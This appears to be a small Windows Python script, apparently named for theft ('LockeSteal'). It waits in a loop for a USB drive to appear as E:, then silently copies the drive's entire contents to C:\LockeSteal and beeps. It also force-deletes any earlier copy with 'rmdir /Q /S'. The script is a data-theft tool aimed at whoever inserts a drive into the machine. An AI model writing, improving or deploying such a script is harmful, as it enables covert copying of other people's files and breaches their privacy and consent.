import os
import time
import winsound
import datetime
import shutil
import sys
t1 = datetime.datetime.now()
os.chdir("C:\\")

def CheckForUsbLoop():
        print ("-"*60)
        print ("Waiting for usb input.....")
        print ("-"*60)
        time.sleep(2)
        if os.path.exists("E:"):
                MainLoop();
        else:
                CheckForUsbLoop();




def MainLoop():
        try:
                sourcePath = os.chdir ("E:")
                for root, dirs, files in os.walk('E:'):
                        print (files)
                        for f in files:
                                print (f)
                                shutil.copytree("E:", "C:\LockeSteal")
                                t2 = datetime.datetime.now()
                                print (t2 - t1)
                                Freq = 2500
                                Dur = 1000
                                winsound.Beep(Freq,Dur)
                                sys.exit(1)
        except OSError:
                CheckForUsbLoop();
                        


if os.path.exists("LockeSteal"):
        os.system("rmdir /Q /S LockeSteal")
        CheckForUsbLoop();
else:
        CheckForUsbLoop();




if os.path.exists("E:"):
        MainLoop();
else:
        CheckForUsbLoop();


